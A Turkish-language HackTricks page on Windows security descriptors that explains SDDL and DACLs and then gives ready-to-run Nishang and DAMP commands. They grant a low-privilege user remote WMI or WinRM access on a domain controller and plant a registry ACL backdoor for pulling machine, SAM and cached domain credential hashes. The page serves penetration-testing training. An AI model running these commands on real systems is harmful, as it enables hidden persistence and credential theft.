# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Windows security descriptors bir sahip SID'si, birincil grup SID'si, erişimi denetleyen bir isteğe bağlı ACL (DACL) ve çoğunlukla denetim için kullanılan bir sistem ACL'si (SACL) içerir. Security Descriptor Definition Language (SDDL), metinsel gösterimdir; bir ACE dizesi `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;` biçimindedir.<sup>[[1]](#references)[[4]](#references)</sup>

Bir security descriptor, securable bir nesnenin kime ait olduğunu ve hangi principal'ların nesne üzerinde belirli haklara izin verildiğini veya reddedildiğini saklar. Bir attacker bir DACL'yi değiştirebilirse, normalde administrative role gerektiren hakları düşük ayrıcalıklı bir principal'a verebilir.

Bu durum, dar kapsamda değiştirilmiş descriptor'ları persistence için kullanışlı hâle getirir: hesap, belirgin privileged group'ların dışında kalırken belirli bir management surface'a erişimini korur. Test etmeden önce orijinal descriptor'ı yedekleyin; böylece değişiklik tam olarak geri alınabilir.

### Access to WMI

Bir kullanıcıya **execute remotely WMI** erişimi verebilirsiniz [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### WinRM'e Erişim

Nishang'in `Set-RemotePSRemoting` function'ı ile bir kullanıcıya uzak PowerShell/WinRM endpoint'ine erişim izni verin:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Hash'lere uzaktan erişim

DAMP, daha sonra machine-account hash'inin, yerel SAM hash'lerinin ve önbelleğe alınmış domain kimlik bilgilerinin uzaktan alınmasına izin veren bir registry-ACL backdoor'u oluşturabilir. Bu dar kapsamlı hakların, özellikle bir domain controller üzerinde, normalde sıradan olan bir hesaba verilmesi; privileged-group üyeliği olmadan güçlü bir kalıcılık sağlar.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md) bölümüne göz atarak bir Domain Controller'ın bilgisayar hesabının hash'ini nasıl kullanabileceğinizi öğrenin.

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Security descriptor string format](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
